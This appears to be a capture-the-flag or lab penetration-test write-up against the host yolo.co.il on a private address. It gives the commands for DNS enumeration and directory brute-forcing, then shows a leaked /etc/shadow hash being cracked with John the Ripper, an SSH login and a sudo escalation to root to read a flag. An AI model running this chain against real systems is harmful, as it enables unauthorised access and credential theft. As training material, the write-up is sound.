# Penetration Testing Report - Stage 1

## Target

**Domain:** yolo.co.il  
**IP Address:** 10.1.22.124

## Tools Used

- dnsenum: DNS enumeration tool
- dirbuster: Directory and file brute-forcing tool
- John the Ripper: Password cracking tool
- nmap: Network scanner
- SSH: Secure Shell
- ls: List directory contents

## 1. DNS Enumeration of yolo.co.il

The penetration test began with DNS enumeration of yolo.co.il using dnsenum. This revealed key details such as the IP address and name server information.

**Command:**
```bash
dnsenum --enum yolo.co.il
```

**Output:**
- IP Address of yolo.co.il: 10.1.22.124
- Mail Server: Not found
- Name Server: 10.1.22.124
- Zone Transfer: Connection refused

**Brute-force Subdomain Enumeration Results:**
- admin.yolo.co.il (A record: 10.1.22.124)
- ftp.yolo.co.il (A record: 192.168.2.8)

## 2. Directory Busting of admin.yolo.co.il

**Command:**
```bash
dirbuster -u http://admin.yolo.co.il -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

**Result:**
- Directory Found: /admin/backup

## 3. Extracting File from /admin/backup

Inside /admin/backup, a file containing sensitive data was discovered. Analysis of the file revealed an entry from /etc/shadow:

- **User:** dexter
- **Password Hash:** $y$j9T$FVrhmaG8xav3NzNyqvkUN.$cKOnOMgGXDigPZRfgnGLP9egOrZgHmqVmPIOwXgB2zD

## 4. Cracking Password with John the Ripper

**Command:**
```bash
john --format=crypt /path/to/shadow
```

**Output:**
- **Password:** iloveyou1

## 5. SSH Access as dexter

The nmap scan identified the SSH service running on port 2222. Using the cracked credentials, an SSH connection was established.

**Command:**
```bash
ssh dexter@10.1.22.124 -p 2222
```

Successful login was achieved as dexter.

## 6. Privilege Escalation

Upon login, an attempt to escalate privileges was made. The dexter user was found to have sudo access.

**Command:**
```bash
sudo su
```

This granted root access to the system.

## 7. Finding the Flag

With root access, a hidden flag file was located using directory listing commands.

**Command:**
```bash
ls -la
```

**Discovered File:** flag1.txt  
**Flag Content:** flag{hidden_flag_1234}

## Conclusion

The penetration test successfully identified and exploited security weaknesses in yolo.co.il. The key takeaways are:

- DNS enumeration revealed subdomains
- Directory busting exposed a sensitive backup directory
- A password hash was extracted and cracked
- SSH access was gained as dexter
- Privileges were escalated to root
- A hidden flag file was discovered

This assessment highlights vulnerabilities that should be addressed to enhance security.
